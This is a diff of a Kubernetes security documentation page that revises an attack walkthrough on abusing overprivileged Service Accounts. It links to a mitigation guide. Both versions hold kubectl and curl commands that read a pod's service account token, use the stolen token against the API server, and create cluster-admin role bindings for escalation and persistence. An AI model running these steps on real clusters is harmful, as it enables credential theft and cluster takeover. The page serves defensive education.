@@ -6,50 +6,54 @@ description: "How attackers exploit overly privileged Kubernetes Service Account
 
 # Privileged Service Accounts
 
-**Service Accounts (SAs)** in Kubernetes provide pods with identities to interact with the cluster API. If **overprivileged**, these accounts can be exploited by attackers to **escalate privileges, manipulate cluster resources, or gain persistent access**.
+Kubernetes **Service Accounts (SAs)** are used by pods to authenticate against the Kubernetes API. When overprivileged or misconfigured, they can be exploited by attackers to **escalate privileges, gain unauthorized access, and persist within the cluster**.
 
 ---
 
 ## Exploitation Steps: Abusing Overprivileged Service Accounts
 
-An attacker exploits **misconfigured Service Accounts** to gain unauthorized access to cluster resources.
+An attacker targets insecure or overly permissive Service Accounts to compromise cluster security.
 
-### Step 1: Identify Overprivileged Service Accounts
+### 1. Enumerate Service Accounts and Roles
 
-The attacker lists available **Service Accounts**:
+The attacker identifies all existing Service Accounts:
 
 ```bash
 kubectl get serviceaccounts --all-namespaces
 ```
 
-Next, they check for **excessive permissions**:
+Then inspects associated role bindings:
 
 ```bash
 kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[].kind=="ServiceAccount")'
 ```
 
-If a Service Account has **cluster-admin** privileges, it is a prime target.
+They look for accounts with elevated roles like `cluster-admin`.
 
-### Step 2: Steal Service Account Tokens
+---
 
-If a pod is running with an overprivileged SA, the attacker accesses its token:
+### 2. Extract a Service Account Token
+
+The attacker identifies a pod using a high-privilege Service Account and extracts its token:
 
 ```bash
-kubectl exec -it attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 --decode
+kubectl exec -it attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
 ```
 
-With this token, the attacker authenticates against the Kubernetes API:
+They decode and use it to access the Kubernetes API:
 
 ```bash
 export TOKEN=<stolen-token>
-curl -H "Authorization: Bearer $TOKEN" https://<api-server>/api/v1/nodes
+curl -H "Authorization: Bearer $TOKEN" https://<api-server>/api/v1/pods
 ```
 
-Now, the attacker can **perform API requests with elevated privileges**.
+This enables **API access with elevated privileges**.
 
-### Step 3: Escalate Privileges Using RBAC Misconfigurations
+---
 
-If a Service Account has **rolebinding privileges**, the attacker **grants themselves elevated permissions**:
+### 3. Escalate Privileges via RBAC Misconfigurations
+
+If the Service Account has rights to create role bindings, the attacker escalates access:
 
 ```yaml
 apiVersion: rbac.authorization.k8s.io/v1
@@ -71,11 +75,13 @@ roleRef:
 kubectl apply -f escalate-privileges.yaml
 ```
 
-Now, the attacker has **cluster-wide administrative control**.
+This grants the attacker **cluster-admin rights**.
 
-### Step 4: Maintain Persistence in the Cluster
+---
 
-The attacker creates a **new Service Account** with privileged access:
+### 4. Establish Persistence via New Service Account
+
+The attacker creates a new Service Account:
 
 ```yaml
 apiVersion: v1
@@ -85,7 +91,7 @@ metadata:
   namespace: default
 ```
 
-Then, they bind it to **cluster-admin**:
+And binds it to `cluster-admin`:
 
 ```yaml
 apiVersion: rbac.authorization.k8s.io/v1
@@ -102,22 +108,20 @@ roleRef:
   apiGroup: rbac.authorization.k8s.io
 ```
 
-```bash
-kubectl apply -f persist-access.yaml
-```
-
-Even if the attacker's original access is revoked, this new **Service Account** ensures **ongoing control over the cluster**.
-
-### Result
-
-The attacker successfully **gained persistent access, escalated privileges, and took control over Kubernetes resources** through an insecure Service Account.
+This ensures **continued access**, even if their original access is revoked.
 
 ---
 
-## Mitigation Steps
+### Result
 
-To protect against **privileged Service Account abuse**, follow the security best practices outlined in:
+The attacker successfully **exploits Service Account misconfigurations** to:
 
-➡ **[Securing Kubernetes Service Accounts](/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/service_account_mitigation)**
+- **Access the Kubernetes API**
+- **Escalate to cluster-admin**
+- **Maintain persistent access to the cluster**
 
-This guide covers techniques such as **restricting RBAC permissions, disabling automatic Service Account mounting, enforcing least privilege, and auditing Service Account usage** to prevent unauthorized access.
+---
+
+## Mitigation
+
+➡ [Securing Kubernetes Service Accounts](/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/service_account_mitigation)
